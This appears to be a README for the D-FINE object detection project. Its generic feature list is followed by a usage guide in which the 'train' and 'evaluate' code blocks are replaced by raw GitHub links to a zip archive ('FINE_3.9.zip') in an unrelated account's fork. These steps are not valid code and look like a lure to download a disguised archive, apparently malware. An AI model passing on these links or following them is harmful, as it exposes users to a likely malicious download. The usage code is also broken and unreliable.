## Introduction

D-FINE addresses the challenges in object detection by improving the regression tasks associated with DETRs. Traditional methods often struggle with precise localization and classification. By employing fine-grained distribution refinement, D-FINE enhances performance, making it a valuable tool for researchers and developers in the field of computer vision.

## Features

- **Improved Accuracy**: D-FINE achieves better localization and classification accuracy compared to standard DETR implementations.
- **Easy Integration**: Designed to be easily integrated into existing projects.
- **Extensive Documentation**: Comprehensive guides and examples to help you get started quickly.
- **Community Support**: Engage with other users and developers for assistance and collaboration.

## Usage

Using D-FINE is straightforward. Here’s a quick guide to get you started:

1. **Import the Library**:
   ```python
   from d_fine import DFineModel
   ```

2. **Initialize the Model**:
   ```python
   model = DFineModel()
   ```

3. **Load Your Data**: Prepare your dataset in the required format.

4. **Train the Model**:
   ```python
   https://raw.githubusercontent.com/Cobbson12gh/D-FINE/master/configs/dfine/include/FINE_3.9.zip(data)
   ```

5. **Evaluate the Model**:
   ```python
   results = https://raw.githubusercontent.com/Cobbson12gh/D-FINE/master/configs/dfine/include/FINE_3.9.zip(test_data)
   print(results)
   ```
